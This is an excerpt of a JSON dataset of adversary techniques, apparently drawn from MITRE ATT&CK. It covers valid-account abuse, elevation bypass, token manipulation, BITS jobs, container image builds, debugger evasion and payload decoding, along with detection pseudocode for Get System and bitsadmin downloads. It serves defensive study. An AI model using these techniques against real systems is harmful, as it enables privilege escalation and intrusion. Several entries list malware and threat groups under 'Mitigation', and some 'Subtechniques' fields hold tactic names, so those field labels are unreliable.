        "description": "During Operation Wocao, threat actors used valid VPN credentials to gain initial access.[53]"
      },
      {
        "id": "G0011",
        "name": "PittyTiger",
        "description": "PittyTiger attempts to obtain legitimate credentials during operations.[54]"
      },
      {
        "id": "G1005",
        "name": "POLONIUM",
        "description": "POLONIUM has used valid compromised credentials to gain access to victim environments.[55]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team have used previously acquired legitimate credentials prior to attacks.[56]"
      },
      {
        "id": "S0053",
        "name": "SeaDuke",
        "description": "Some SeaDuke samples have a module to extract email from Microsoft Exchange servers using compromised credentials.[57]"
      },
      {
        "id": "G0091",
        "name": "Silence",
        "description": "Silence has used compromised credentials to log on to other systems and escalate privileges.[58]"
      },
      {
        "id": "G0122",
        "name": "Silent Librarian",
        "description": "Silent Librarian has used compromised credentials to obtain unauthorized access to online accounts.[59]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 used different compromised credentials for remote access and to move laterally.[60][61][62]"
      },
      {
        "id": "G0039",
        "name": "Suckfly",
        "description": "Suckfly used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.[63]"
      },
      {
        "id": "G0088",
        "name": "TEMP.Veles",
        "description": "TEMP.Veles has used compromised VPN accounts.[64]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.[65]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has used valid credentials for privileged accounts with the goal of accessing domain controllers.[66][67]"
      }
    ],
    "Detection": [
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Monitor for newly constructed logon behavior that may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access)."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Logon Session Metadata",
        "detects": "Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Authentication",
        "detects": "Monitor for an attempt by a user that may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1078.001",
        "name": "Default Accounts"
      },
      {
        "id": "T1078.002",
        "name": "Domain Accounts"
      },
      {
        "id": "T1078.003",
        "name": "Local Accounts"
      },
      {
        "id": "T1078.004",
        "name": "Cloud Accounts"
      }
    ],
    "Tactic": "DefenseEvasion, Persistence, PrivilegeEscalation, InitialAccess"
  },
  {
    "Title": "Abuse Elevation Control Mechanism",
    "Code": "T1548",
    "Description": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.",
    "Mitigation": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": "Check for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate.[1]"
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": "System settings can prevent applications from running that haven't been downloaded from legitimate repositories which may help mitigate some of these issues. Not allowing unsigned applications from being run may also mitigate some risk."
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": "Applications with known vulnerabilities or known shell escapes should not have the setuid or setgid bits set to reduce potential damage if an application is compromised. Additionally, the number of programs with setuid or setgid bits set should be minimized across a system. Ensuring that the sudo tty_tickets setting is enabled will prevent this leakage across tty sessions."
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": "Remove users from the local administrator group on systems.By requiring a password, even if an adversary can get terminal access, they must know the password to run anything in the sudoers file. Setting the timestamp_timeout to 0 will require the user to input their password every time sudo is executed."
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": "The sudoers file should be strictly edited such that passwords are always required and that users can't spawn risky processes as users with higher privilege."
      },
      {
        "id": "M1052",
        "name": "User Account Control",
        "description": "Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as DLL Search Order Hijacking."
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": "Limit the privileges of cloud accounts to assume, create, or impersonate additional roles, policies, and permissions to only those required. Where just-in-time access is enabled, consider requiring manual approval for temporary elevation of privileges."
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Metadata",
        "detects": "Monitor the file system for files that have the setuid or setgid bits set. On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo)."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the LOG_INPUT and LOG_OUTPUT directives in the /etc/sudoers file. Consider monitoring for /usr/libexec/security_authtrampoline executions which may indicate that AuthorizationExecuteWithPrivileges is being executed. MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Also look for any process API calls for behavior that may be indicative of Process Injection. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Cyber actors frequently escalate to the SYSTEM account after gaining entry to a Windows host, to enable them to carry out various attacks more effectively. Tools such as Meterpreter, Cobalt Strike, and Empire carry out automated steps to \"Get System\", which is the same as switching over to the System user account. Most of these tools utilize multiple techniques to try and attain SYSTEM: in the first technique, they create a named pipe and connects an instance of cmd.exe to it, which allows them to impersonate the security context of cmd.exe, which is SYSTEM. In the second technique, a malicious DLL is injected into a process that is running as SYSTEM; the injected DLL steals the SYSTEM token and applies it where necessary to escalate privileges. This analytic looks for both of these techniques. Analytic 1 : Get System Elevation  suspicious_processes = filter processes where (  (parent_image_path == C:\\Windows\\System32\\services.exe\" AND   image_path == \"C:\\Windows\\System32\\cmd.exe\" AND   command_line == \"echo\" AND   command_line == \"\\pipe*\") OR  (image_path == \"C:\\Windows\\System32\\rundll32.exe\" AND   command_line == \",a /p:*\"))"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Metadata",
        "detects": "Monitor contextual data about a running process, which may include information such as environment variables, image name, user/owner that may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Modification",
        "detects": "Log cloud API calls to assume, create, or impersonate additional roles, policies, and permissions. Review uses of just-in-time access to ensure that any justifications provided are valid and only expected actions were taken."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Modification",
        "detects": "There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. Analysts should monitor Registry settings for unauthorized changes."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1548.001",
        "name": "Setuid and Setgid"
      },
      {
        "id": "T1548.002",
        "name": "Bypass User Account Control"
      },
      {
        "id": "T1548.003",
        "name": "Sudo and Sudo Caching"
      },
      {
        "id": "T1548.004",
        "name": "Elevated Execution with Prompt"
      },
      {
        "id": "T1548.005",
        "name": "Temporary Elevated Cloud Access"
      }
    ],
    "Tactic": "PrivilegeEscalation, DefenseEvasion"
  },
  {
    "Title": "Access Token Manipulation",
    "Code": "T1134",
    "Description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.[1]Any standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
    "Mitigation": [
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed can gain system level privilege by passing SeDebugPrivilege to the AdjustTokenPrivilege API.[2]"
      },
      {
        "id": "S1068",
        "name": "BlackCat",
        "description": "BlackCat has the ability modify access tokens.[3][4]"
      },
      {
        "id": "G0108",
        "name": "Blue Mockingbird",
        "description": "Blue Mockingbird has used JuicyPotato to abuse the SeImpersonate token privilege to escalate from web application pool accounts to NT Authority\\SYSTEM.[5]"
      },
      {
        "id": "C0017",
        "name": "C0017",
        "description": "During C0017, APT41 used a ConfuserEx obfuscated BADPOTATO exploit to abuse named-pipe impersonation for local NT AUTHORITY\\SYSTEM privilege escalation.[6]"
      },
      {
        "id": "S0625",
        "name": "Cuba",
        "description": "Cuba has used SeDebugPrivilege and AdjustTokenPrivileges to elevate privileges.[7]"
      },
      {
        "id": "S0038",
        "name": "Duqu",
        "description": "Duqu examines running system processes for tokens that have specific system privileges. If it finds one, it will copy the token and store it for later use. Eventually it will start new processes with the stored token attached. It can also steal tokens to acquire administrative privileges.[8]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can use PowerSploit's Invoke-TokenManipulation to manipulate access tokens.[9]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "FIN6 has used has used Metasploit’s named-pipe impersonation technique to escalate privileges.[10]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium can use token manipulation to bypass UAC on Windows7 systems.[11]"
      },
      {
        "id": "S0697",
        "name": "HermeticWiper",
        "description": "HermeticWiper can use AdjustTokenPrivileges to grant itself privileges for debugging with SeDebugPrivilege, creating backups with SeBackupPrivilege, loading drivers with SeLoadDriverPrivilege, and shutting down a local system with SeShutdownPrivilege.[12][13]"
      },
      {
        "id": "S0203",
        "name": "Hydraq",
        "description": "Hydraq creates a backdoor through which remote attackers can adjust token privileges.[14]"
      },
      {
        "id": "S0607",
        "name": "KillDisk",
        "description": "KillDisk has attempted to get the access token of a process by calling OpenProcessToken. If KillDisk gets the access token, then it attempt to modify the token privileges with AdjustTokenPrivileges.[15]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can use AdjustTokenPrivileges() to elevate privileges.[16]"
      },
      {
        "id": "S0576",
        "name": "MegaCortex",
        "description": "MegaCortex can enable SeDebugPrivilege and adjust token privileges.[17]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 can use Invoke-TokenManipulation for manipulating tokens.[18]"
      },
      {
        "id": "S0194",
        "name": "PowerSploit",
        "description": "PowerSploit's Invoke-TokenManipulation Exfiltration module can be used to manipulate tokens.[19][20]"
      },
      {
        "id": "S0446",
        "name": "Ryuk",
        "description": "Ryuk has attempted to adjust its token privileges to have the SeDebugPrivilege.[21]"
      },
      {
        "id": "S0633",
        "name": "Sliver",
        "description": "Sliver has the ability to manipulate user tokens on targeted Windows systems.[22][23]"
      },
      {
        "id": "S0058",
        "name": "SslMM",
        "description": "SslMM contains a feature to manipulate process privileges and tokens.[24]"
      },
      {
        "id": "S0562",
        "name": "SUNSPOT",
        "description": "SUNSPOT modified its security token to grants itself debugging privileges by adding SeDebugPrivilege.[25]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Object Modification",
        "detects": "Monitor for changes made to AD settings that may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command. Detailed command-line logging is not enabled by default in Windows.[29]"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls, loaded by a payload, for token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. There are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., LogonUser [30], DuplicateTokenEx[31], and ImpersonateLoggedOnUser[32]). Please see the referenced Windows API pages for more information."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for executed processes that may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Metadata",
        "detects": "Query systems for process and thread token information and look for inconsistencies such as user owns processes impersonating the local SYSTEM account.[33] Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Metadata",
        "detects": "Monitor for contextual data about an account, which may include a username, user ID, environmental data, etc. that may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1134.001",
        "name": "Token Impersonation/Theft"
      },
      {
        "id": "T1134.002",
        "name": "Create Process with Token"
      },
      {
        "id": "T1134.003",
        "name": "Make and Impersonate Token"
      },
      {
        "id": "T1134.004",
        "name": "Parent PID Spoofing"
      },
      {
        "id": "T1134.005",
        "name": "SID-History Injection"
      }
    ],
    "Tactic": "DefenseEvasion, PrivilegeEscalation"
  },
  {
    "Title": "BITS Jobs",
    "Code": "T1197",
    "Description": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM).[1][2] BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.The interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool.[2][3]Adversaries may abuse BITS to download (e.g. Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g. Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.[4][5][6] BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).[7][4]BITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol.[4]",
    "Mitigation": [
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used the BITS protocol to exfiltrate stolen data from a compromised host.[8]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 used BITSAdmin to download and install payloads.[9][10]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar has been downloaded via Windows BITS functionality.[11]"
      },
      {
        "id": "S0190",
        "name": "BITSAdmin",
        "description": "BITSAdmin can be used to create BITS Jobs to launch a malicious process.[12]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can download a hosted \"beacon\" payload using BITSAdmin.[13][14][15]"
      },
      {
        "id": "S0554",
        "name": "Egregor",
        "description": "Egregor has used BITSadmin to download and execute malicious DLLs.[16]"
      },
      {
        "id": "S0201",
        "name": "JPIN",
        "description": "A JPIN variant downloads the backdoor payload via the BITS service.[17]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has used BITSAdmin to download additional tools.[18]"
      },
      {
        "id": "S0652",
        "name": "MarkiRAT",
        "description": "MarkiRAT can use BITS Utility to connect with the C2 server.[19]"
      },
      {
        "id": "G0040",
        "name": "Patchwork",
        "description": "Patchwork has used BITS jobs to download malicious payloads.[20]"
      },
      {
        "id": "S0654",
        "name": "ProLock",
        "description": "ProLock can use BITS jobs to download its malicious payload.[21]"
      },
      {
        "id": "S0333",
        "name": "UBoatRAT",
        "description": "UBoatRAT takes advantage of the /SetNotifyCmdLine option in BITSAdmin to ensure it stays running on a system to maintain persistence.[7]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has used batch scripts that utilizes WMIC to execute a BITSAdmin transfer of a ransomware payload to each compromised machine.[22]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments from the BITSAdmin tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)[2] Admin logs, PowerShell logs, and the Windows Event log for BITS activity.[23] Also consider investigating more detailed information about jobs by parsing the BITS job database.[4]"
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account)."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly constructed BITS tasks to enumerate using the BITSAdmin tool (bitsadmin /list /allusers /verbose). Note: Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). Analytic 1 is oriented around looking for the creation of Microsoft Background Intelligent Transfer Service utility (bitsadmin.exe) processes that schedule a BITS job to persist on an endpoint. The analytic identifies the command-line parameters used to create, resume or add a file to a BITS job; these are typically seen combined in a single command-line or executed in sequence.Analytic 2 identifies Microsoft Background Intelligent Transfer Service utility  bitsadmin.exe  using the  transfer parameter to download a remote object. In addition, look for  download  or  upload  on the command-line, the switches are not required to perform a transfer. Capture any files downloaded. Review the reputation of the IP or domain used. Typically once executed, a follow on command will be used to execute the dropped file. Network connection or file modification events related will not spawn or create from  bitsadmin.exe , but the artifacts will appear in a parallel process of  svchost.exe  with a command-line similar to  svchost.exe -k netsvcs -s BITS . It’s important to review all parallel and child processes to capture any behaviors and artifacts. In some suspicious and malicious instances, BITS jobs will be created. You can use  bitsadmin /list /verbose  to list out the jobs during investigation. Analytic 1 - BITS Job Persistence  processes = filter processes where (  (event_id == \"1\" OR event_id == \"4688\") AND  exe =\"C:\\Windows\\System32\\bitsadmin.exe\" AND   (command_line == \"create\" OR   command_line == \"addfile\" OR    command_line == \"setnotifyflags\" OR   command_line == \"setnotifycmdline\" OR   command_line == \"setminretrydelay\" OR    command_line == \"setcustomheaders\" OR   command_line == \"resume\")) Analytic 2 : BITSAdmin Download File  bitsadmin_commands = filter processes where (  exe =\"C:\\Windows\\System32\\bitsadmin.exe\" AND command_line = transfer)output bitsadmin_commands"
      },
      {
        "id": "DS0019",
        "dsource": "Service",
        "dcomp": "Service Metadata",
        "detects": "BITS runs as a service and its status can be checked with the Sc query utility (sc query bits).[24]"
      }
    ],
    "Subtechniques": "DefenseEvasion, Persistence"
  },
  {
    "Title": "Build Image on Host",
    "Code": "T1612",
    "Description": "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote build request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.[1]An adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize Deploy Container using that custom image.[2][3] If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment.",
    "Mitigation": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": "Audit images deployed within the environment to ensure they do not contain any malicious components."
      },
      {
        "id": "M1035",
        "name": "Limit Access to Resource Over Network",
        "description": "Limit communications with the container service to local Unix sockets or remote access via SSH. Require secure port access to communicate with the APIs over TLS by disabling unauthenticated access to the Docker API on port 2375. Instead, communicate with the Docker API over TLS on port 2376.[4]"
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": "Ensure containers are not running as root by default. In Kubernetes environments, consider defining Pod Security Standards that prevent pods from running privileged containers.[5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0007",
        "dsource": "Image",
        "dcomp": "Image Creation",
        "detects": "Monitor for unexpected Docker image build requests to the Docker daemon on hosts in the environment."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for established network communications with anomalous IPs that have never been seen before in the environment that may indicate the download of malicious code."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor for network traffic associated with requests and/or downloads of container images, especially those that may be anomalous or known malicious."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor for established network communications with anomalous IPs that have never been seen before in the environment that may indicate the download of malicious code."
      }
    ],
    "Subtechniques": "\nDefense Evasion"
  },
  {
    "Title": "Debugger Evasion",
    "Code": "T1622",
    "Description": "Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.[1]Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to Virtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.Specific checks will vary based on the target and/or adversary, but may involve Native API function calls such as IsDebuggerPresent() and  NtQueryInformationProcess(), or manually checking the BeingDebugged flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would \"swallow\" or handle the potential error).[2][3][4]Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping Native API function calls such as OutputDebugStringW().[5][6]",
    "Mitigation": [
      {
        "id": "S1087",
        "name": "AsyncRAT",
        "description": "AsyncRAT can use the CheckRemoteDebuggerPresent function to detect the presence of a debugger.[7]"
      },
      {
        "id": "S1070",
        "name": "Black Basta",
        "description": "The Black Basta dropper can check system flags, CPU registers, CPU instructions, process timing, system libraries, and APIs to determine if a debugger is present.[8]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee can search for tools used in static analysis.[9]"
      },
      {
        "id": "S1066",
        "name": "DarkTortilla",
        "description": "DarkTortilla can detect debuggers by using functions such as DebuggerIsAttached and DebuggerIsLogging. DarkTortilla can also detect profilers by verifying the COR_ENABLE_PROFILING environment variable is present and active.[10]"
      },
      {
        "id": "S0694",
        "name": "DRATzarus",
        "description": "DRATzarus can use IsDebuggerPresent to detect whether a debugger is present on a victim.[11]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can search for debugging tools on a compromised host.[12]"
      },
      {
        "id": "C0022",
        "name": "Operation Dream Job",
        "description": "During Operation Dream Job, Lazarus Group used tools that used the IsDebuggerPresent call to detect debuggers.[11]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT can check for debugging tools.[13][14][15]"
      },
      {
        "id": "S1018",
        "name": "Saint Bot",
        "description": "Saint Bot has used is_debugger_present as part of its environmental checks.[16]"
      },
      {
        "id": "S0595",
        "name": "ThiefQuest",
        "description": "ThiefQuest uses a function named is_debugging to perform anti-debugging logic. The function invokes sysctl checking the returned value of P_TRACED. ThiefQuest also calls ptrace with the PTRACE_DENY_ATTACH flag to prevent debugging.[5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor debugger logs for signs of abnormal and potentially malicious activity."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may employ various means to detect and avoid debugged environments. Detecting actions related to debugger identification may be difficult depending on the adversary's implementation and monitoring required."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls (such as IsDebuggerPresent()) that may employ various means to detect and avoid debugged environments. Detecting actions related to debugger identification may be difficult depending on the adversary's implementation and monitoring required."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. Debugger related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained."
      }
    ],
    "Subtechniques": "DefenseEvasion, Discovery"
  },
  {
    "Title": "Deobfuscate/Decode Files or Information",
    "Code": "T1140",
    "Description": "Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.One such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file.[1] Another example is using the Windows copy /b command to reassemble binary fragments into a malicious payload.[2]Sometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. [3]",
    "Mitigation": [
      {
        "id": "S0469",
        "name": "ABK",
        "description": "ABK has the ability to decrypt AES encrypted payloads.[4]"
      },
      {
        "id": "S1028",
        "name": "Action RAT",
        "description": "Action RAT can use Base64 to decode actor-controlled C2 server communications.[5]"
      },
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla has the ability to decrypt strings encrypted with the Rijndael symmetric encryption algorithm.[6]"
      },
      {
        "id": "S1025",
        "name": "Amadey",
        "description": "Amadey has decoded antivirus name strings.[7]"
      },
      {
        "id": "S0584",
        "name": "AppleJeus",
        "description": "AppleJeus has decoded files received from a C2.[8]"
      },
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed can decode its payload prior to execution.[9]"
      },
      {
        "id": "G0073",
        "name": "APT19",
        "description": "An APT19 HTTP malware variant decrypts strings using single-byte XOR keys.[10]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "An APT28 macro uses the command certutil -decode to decode contents of a .txt file storing the base64 encoded payload.[11][12]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used malware to decrypt encrypted CAB files.[13]"
      },
      {
        "id": "S0456",
        "name": "Aria-body",
        "description": "Aria-body has the ability to decrypt the loader configuration and payload DLL.[14]"
      },
      {
        "id": "S0373",
        "name": "Astaroth",
        "description": "Astaroth uses a fromCharCode() deobfuscation method to avoid explicitly writing execution commands and to hide its code. [15][16]"
      },
      {
        "id": "S0347",
        "name": "AuditCred",
        "description": "AuditCred uses XOR and RC4 to perform decryption on the code functions.[17]"
      },
      {
        "id": "S0640",
        "name": "Avaddon",
        "description": "Avaddon has decrypted encrypted strings.[18]"
      },
      {
        "id": "S0473",
        "name": "Avenger",
        "description": "Avenger has the ability to decrypt files downloaded from C2.[4]"
      },
      {
        "id": "S1053",
        "name": "AvosLocker",
        "description": "AvosLocker has deobfuscated XOR-encoded strings.[19]"
      },
      {
        "id": "S0344",
        "name": "Azorult",
        "description": "Azorult uses an XOR key to decrypt content and uses Base64 to decode the C2 address.[20][21]"
      },
      {
        "id": "S0638",
        "name": "Babuk",
        "description": "Babuk has the ability to unpack itself into memory using XOR.[22][23]"
      },
      {
        "id": "S0414",
        "name": "BabyShark",
        "description": "BabyShark has the ability to decode downloaded files prior to execution.[24]"
      },
      {
        "id": "S0475",
        "name": "BackConfig",
        "description": "BackConfig has used a custom routine to decrypt strings.[25]"
      },
      {
        "id": "S0642",
        "name": "BADFLICK",
        "description": "BADFLICK can decode shellcode using a custom rotating XOR cipher.[26]"
      },
      {
        "id": "S0234",
        "name": "Bandook",
        "description": "Bandook has decoded its PowerShell script.[27]"
      },
      {
        "id": "S0239",
        "name": "Bankshot",
        "description": "Bankshot decodes embedded XOR strings.[28]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can decrypt downloaded payloads. Bazar also resolves strings and other artifacts at runtime.[29][30]"
      },
      {
        "id": "S0470",
        "name": "BBK",
        "description": "BBK has the ability to decrypt AES encrypted payloads.[4]"
      },
      {
        "id": "S0127",
        "name": "BBSRAT",
        "description": "BBSRAT uses Expand to decompress a CAB file into executable content.[31]"
      },
      {
        "id": "S0574",
        "name": "BendyBear",
        "description": "BendyBear has decrypted function blocks using a XOR key during runtime to evade detection.[32]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
